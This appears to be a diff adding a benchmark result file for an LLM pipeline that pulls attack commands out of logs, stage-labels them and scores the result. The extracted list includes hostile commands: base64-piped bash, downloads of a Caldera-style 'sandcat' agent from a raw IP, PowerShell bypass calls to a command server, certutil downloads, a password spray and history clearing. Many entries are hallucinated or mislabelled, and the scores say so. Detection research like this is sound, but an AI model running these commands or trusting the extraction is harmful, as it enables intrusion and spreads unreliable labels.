@@ -1,0 +1,395 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=\"Metadata:true\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cht -H ",
+        "stage": "Execution"
+      },
+      {
+        "command": "wget --version",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "/bin/bash -c bash -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Discovery"
+      },
+      {
+        "command": "../../../../../etc/passwd",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c echo start:45bb8334-da17-4da5-a25f-c29074ed0028",
+        "stage": "Discovery"
+      },
+      {
+        "command": "rm -rf /tmp/*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c rm -rf /tmp/*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\":\";cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c bash -c   rm -rf /tmp/*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C :;Remove-WmiObject Win32_Service Where{ Name LIKE '%\\%'};New-NetFirewallRule -DisplayName 'WINRM Service' -Enabled TRUE -Direction Inbound -Protocol TCP -LocalPort 5985",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $wc.DownloadFile($url,$output); cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Remove-WmiObject Win32_Service Where{ Name LIKE '%\\%'}; New-NetFirewallRule -DisplayName ''WINRM Service'' -Enabled True -Direction Inbound -Protocol Tcp -LocalPort 5985",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\": Remove-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\* -Name Debugger -Force;  Start-Sleep -S 10 ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "power sploit/Recon/Audit/Misc/Bitly.ps1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $wc.DownloadFile($urll, $output)",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\": Remove-ItemProperty HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value \"%SystemRoot%\\System32\\imrsvc.dll,IMRServiceClass\" -Force",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\": Set-Alias -Name ls -Value Get-Childdir -Scope Global -Force",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module BitsTransfer",
+        "stage": "Execution"
+      },
+      {
+        "command": "unset LD_LIBRARY_PATH",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset KRB5_CONFIG",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset HISTFILE",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset HOME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset GPG_TTY",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset ENV",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset DISPLAY",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CURL_SSL_BACKEND",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CURL_CA_BUNDLE",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset COMPLETION=/dev/null",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CHILDREN",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CERTIFICATES_DIR",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset AWS_ACCESS_KEY_ID",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset ALLUSERSPROFILE",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset _JAVA_OPTIONS",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset _JAVA_AWT_WM_NONREPARENTING",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset _EVENTLOG_PUBLISHER_SUBSCRIPTIONS",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset APPDATA",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset USER",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset SSH_AGENT_PID",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset RUNAS_USER",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset REPORTPATH",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset PATH",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset PERCONA_HOME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset PASSWORD_FILE",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset OS_RELEASE_INFO_NAME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset NO_PROXY",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset LOCALAPPDATA",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset JAVA_OPTS",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset HTTP_PROXY",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset GIT_TERMINAL_PROMPT",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset GOPATH",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset GRUB_PREFIX",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset GCC_COLORS",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset FREETDS_ACCTNAME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset DPKG_EXPORT_DEBINFO_HOOK",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CPANM_CPANMHOME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset DBUS_SESSION_BUS_ADDRESS",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CONDA_ENV_PATH",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset CHILD_PROCESS_MAX_SIZE",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset COMPOSER_HOME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset BOOTSTRAP_TOKEN",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset ANACONDA_HOME",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "unset ACM_VM",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "chown -R www-data:www-data /var/www/html/",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "bash -c chown -R www-data:www-data /var/www/html/",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c     shopt -s globstar",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "--",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c unset CLUTTER_FDO_VARIANT",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c gsettings set org.gnome.desktop.screensaver lock-enabled false",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack began with an initial access attempt using the x.exe URL and establishment of persistence on the system. It continued with discovery of the target environment followed by credential access, privilege escalation, collection of data, defense evasion, and finally, communication to remote servers for further attacks.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 31921,
+      "completion_tokens": 8597,
+      "total_tokens": 40518,
+      "wall_clock_s": 105.551,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06976744186046512,
+      "recall": 0.6,
+      "f1": 0.125,
+      "tp": 6,
+      "fp": 80,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.03488372093023256,
+      "recall": 0.3333333333333333,
+      "f1": 0.06315789473684211,
+      "tp": 3,
+      "fp": 83,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.45454545454545453,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 31921,
+      "completion_tokens": 8597,
+      "total_tokens": 40518,
+      "wall_clock_s": 105.551,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
